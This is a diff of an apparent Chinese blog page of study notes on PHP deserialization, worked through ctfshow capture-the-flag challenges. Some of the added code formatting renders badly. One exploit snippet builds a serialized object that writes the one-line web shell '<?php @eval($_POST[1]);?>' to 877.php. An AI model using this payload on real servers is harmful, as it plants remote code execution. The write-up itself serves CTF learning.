@@ -465,14 +465,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.9k
+                    3.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    11 分
+                    12 分
                 </div>
                 
 
@@ -516,15 +516,29 @@
 <li>  上图 s表示string类型 6表示6位 “xiaodi”表示值为”xiaodi”</li>
 <li>  serialize()和unserialize()都是要先进行格式的判断，如果假如给一个字符串进行unserialize()则没有返回结果，如果给一个对象进行serialize()则也没有对象，因为数据类型格式不对，无法识别。</li>
 </ol>
-<h1 id="PHP反序列化真题"><a href="#PHP反序列化真题" class="headerlink" title="PHP反序列化真题"></a>PHP反序列化真题</h1><h2 id="添加cookie的方法："><a href="#添加cookie的方法：" class="headerlink" title="添加cookie的方法："></a>添加cookie的方法：</h2><ol>
-<li>  用burp去添加cookie，抓包后添加指定名字的cookie，只需要在cookie的后面加上待添加cookie的名称=待添加的值，即可</li>
-</ol>
-<pre class="line-numbers language-html" data-language="html"><code class="language-html">Cookie: user=xxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="注意PHP单引号和双引号的区别"><a href="#注意PHP单引号和双引号的区别" class="headerlink" title="注意PHP单引号和双引号的区别"></a>注意PHP单引号和双引号的区别</h2><ol>
+<li><p>  php里的单引号会把内容当作纯文本，不会经过服务器翻译</p>
+</li>
+<li><p>  而双引号相反，里面的内容会经过服务器处理</p>
+</li>
+<li><p>```php<br>  $foo=”data”;<br>  echo ‘$foo’; //单引号会输出$foo<br>  echo “$foo”; //双引号会转义，输出data</p>
+  <pre class="line-numbers language-none"><code class="language-none">
+4.   单引号不能处理变量和转义字符，**除了(\\\和\)**
 
-<ol start="2">
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805133836.png"></li>
-<li>  用firefox的插件添加</li>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805133940.png"></li>
+# PHP反序列化真题
+
+## 添加cookie的方法：
+
+1.   用burp去添加cookie，抓包后添加指定名字的cookie，只需要在cookie的后面加上待添加cookie的名称&#x3D;待添加的值，即可
+
+&#96;&#96;&#96;html
+Cookie: user&#x3D;xxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805133836.png"></p>
+</li>
+<li><p>  用firefox的插件添加</p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805133940.png"></p>
+</li>
 </ol>
 <h2 id="序列化一个类的语法"><a href="#序列化一个类的语法" class="headerlink" title="序列化一个类的语法"></a>序列化一个类的语法</h2><ol>
 <li>  将一个类实例化 (实例化时在类的后面加不加括号都可以，不影响输出的结果)。</li>
@@ -535,14 +549,14 @@
 
 <h2 id="对类的控制"><a href="#对类的控制" class="headerlink" title="对类的控制"></a>对类的控制</h2><ol>
 <li>  我们不能改类的方法，即不能改类中的代码</li>
-<li>  但是我们可以控制类的属性，即更改类中变量的值</li>
+<li>  但是我们<strong>可以控制类的属性</strong>，即<strong>更改类中变量的值</strong>，例如，源码为：public isvip = true;我们可以改为public isvip = false;</li>
 </ol>
 <h2 id="ctfshow原题"><a href="#ctfshow原题" class="headerlink" title="ctfshow原题"></a>ctfshow原题</h2><h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><ol>
 <li>  对cookie进行反序列化，需要调用user中的login函数，而此函数在ctfShowUser类中出现，则需要对ctfShowUser进行反序列化</li>
 <li>  使用php在线反序列化工具即可</li>
 </ol>
-<h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">==     数值相等  可以进行数据类型转换，如果类型转换后$a和$b相等，则为true
-===   全等   不进行数据类型转换，如果$a等于$b，并且数据类型也相同，才能为true
+<h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">==     数值相等  可以进行数据类型转换（在比较前进行转换），如果类型转换后$a和$b相等，则为true
+===   全等   不进行数据类型转换（不在比较前进行转换），如果$a等于$b，并且数据类型也相同，才能为true
 !=     不等   可以进行数据类型转换，如果类型转换后$a和$b不相等，返回值为true
 !==    不全等  不进行数据类型转换，如果$a和$b不相等，或者类型不相同，返回值为true
 &lt;=>    太空船运算符  当$a小于，等于，大于$b时分别返回一个小于，等于，大于0的int值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
@@ -563,11 +577,11 @@
 <h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><ol>
 <li><p>  __destruct()：折构函数/方法</p>
 </li>
-<li><p>  析构函数的作用和构造函数正好相反，析构函数只有在对象被垃圾收集器收集前（即对象从内存中删除之前）才会被自动调用。析构函数允许我们在销毁一个对象之前执行一些特定的操作，例如关闭文件、释放结果集等。</p>
+<li><p>  析构函数的作用和构造函数正好相反，<strong>析构函数只有在对象被垃圾收集器收集前</strong>（即对象从内存中删除之前）<strong>才会被自动调用</strong>。析构函数允许我们在销毁一个对象之前执行一些特定的操作，例如关闭文件、释放结果集等。</p>
 </li>
-<li><p>  在 PHP 中有一种垃圾回收机制，当对象不能被访问时就会自动启动垃圾回收机制，收回对象占用的内存空间。而析构函数正是在垃圾回收机制回收对象之前调用的。</p>
+<li><p>  在 PHP 中有一种垃圾回收机制，<strong>当对象不能被访问时就会自动启动垃圾回收机制</strong>，<strong>收回对象占用的内存空间</strong>。而析构函数正是在垃圾回收机制回收对象之前调用的。</p>
 </li>
-<li><p>析构函数不能带有任何参数</p>
+<li><p>析构函数不能带有任何参数,即无参析构函数（参考无参构造函数）</p>
   <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
     <span class="token operator">...</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
@@ -576,7 +590,7 @@
 </ol>
 <h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><ol>
 <li>  ctfShowUser中调用了info()类，但是还提供了另一个backDoor类</li>
-<li>  在反序列化时，我们只能控制类的属性，即类中变量的值，不能控制类的方法，即不能更改类的代码</li>
+<li>  在反序列化时，我们只能控制类的属性，即类中变量的值，不能控制类的方法的代码，即不能更改类的代码</li>
 <li>  可以直接将ctfShowUser类中对info类的控制改为对backDoor的控制</li>
 </ol>
 <p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805151736.png"></p>
@@ -611,8 +625,8 @@
 </li>
 </ol>
 <h2 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h2><h3 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h3><ol>
-<li>  serialize()函数是对对象进行序列化，序列化是对象，而字符串也是一个对象</li>
-<li>  字符串序列化后还是包括它本身，只是多了类型等信息</li>
+<li>  serialize()函数是<strong>对对象进行序列化</strong>，序列化是对象，而字符串也是一个对象</li>
+<li>  <strong>字符串序列化后还是包括它本身</strong>，只是多了类型等信息</li>
 </ol>
 <p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220806182604.png"></p>
 <h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20220806182712288.png" alt="image-20220806182712288"></p>
@@ -634,8 +648,44 @@
 <ol>
 <li><p>  因为这个地方没有调用实例化后的类，并且在类后面显式地加入参数，所以这里的__invoke()函数是用不到的</p>
 </li>
-<li><p>  __wakeup()在类的外部使用unserialize()函数进行调用时，会自动调用__wakeup函数，这个函数判断username和password是否为空</p>
-</li>
+<li><p>```php<br>  // php __invoke()函数的使用<br>  // __invoke()函数会在将一个对象当作一个方法来使用时自动调用<br>  public mixed __invoke() {</p>
+<pre><code>  //其它功能
+</code></pre>
+<p>  }<br>  // 意义就是：可以将实例当作普通方法来调用<br>  //例如下面：$Person = new Person(); 此时的$Person就可以当作普通方法</p>
+  <?php
+  class Person
+  {
+      public $sex;
+      public $name;
+      public $age;
+  
+      public function __construct($name="",  $age=25, $sex='Male')
+      {
+          $this->name = $name;
+          $this->age  = $age;
+          $this->sex  = $sex;
+      }
+  
+      public function __invoke()
+      {
+          return '你好，我的名字是: '. $this->name . '，我 '. $this->age .' 岁了。';
+      }
+  }
+  
+  $person = new Person('Yufei',30,'Male');
+  
+  echo $person(), "\n";
+  <pre class="line-numbers language-none"><code class="language-none">
+3.   
+
+4.   __wakeup()在类的外部使用unserialize()函数进行调用时，**会自动调用\__wakeup函数**，这个函数判断username和password是否为空
+
+5.   &#96;&#96;&#96;php
+     &#x2F;&#x2F;就是当使用unserialize()反序列化一个对象成功后，会自动调用这个对象的__wakeup()魔术方法
+     public function __wakeup() &#123;
+         &#x2F;&#x2F;一些其它的初始化操作
+     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li></li>
 <li><p>  在__destruct()函数中，使用file_put_contents将password写入username中，所以这个地方要求username是一个文件，password可以是一句话木马</p>
 </li>
 <li><p>0x36d是877，这里是弱类型比较</p>
@@ -649,10 +699,9 @@
         <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token operator">=</span><span class="token string single-quoted-string">'877.php'</span><span class="token punctuation">;</span>
         <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token operator">=</span><span class="token string single-quoted-string">'&lt;?php @eval($_POST[1]);?>'</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
-	
 <span class="token punctuation">&#125;</span>
  
-<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowvip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowvip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <ol start="5">
 <li>  将序列化后的代码用?vip=拼接到后面</li>
@@ -1360,7 +1409,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">108.8k</span>&nbsp;字
+                class="white-color">132.1k</span>&nbsp;字
             
             
             
